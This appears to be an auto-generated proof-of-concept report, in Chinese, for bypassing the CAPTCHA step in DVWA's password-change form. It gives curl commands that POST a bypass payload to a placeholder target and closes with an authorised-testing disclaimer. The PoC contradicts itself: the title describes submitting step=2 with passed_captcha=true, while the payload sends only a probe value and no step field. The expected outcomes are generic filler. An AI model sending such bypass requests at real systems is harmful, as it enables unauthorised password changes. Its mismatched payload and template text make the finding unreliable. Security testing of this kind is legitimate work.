# POC — DVWA 密码修改流程 CAPTCHA 状态机可绕过（step=2 直接提交 passed_captcha=true）

- finding_id: `LLM-c737fb0d7fd9`
- type: `captcha_bypass` / CWE-804
- severity: `high`
- file: `015.php:69`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/015.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 验证码绕过 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/015.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'passed_captcha=SUNSET_PROBE'
```
预期：按漏洞类型观察相应的异常响应/副作用。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。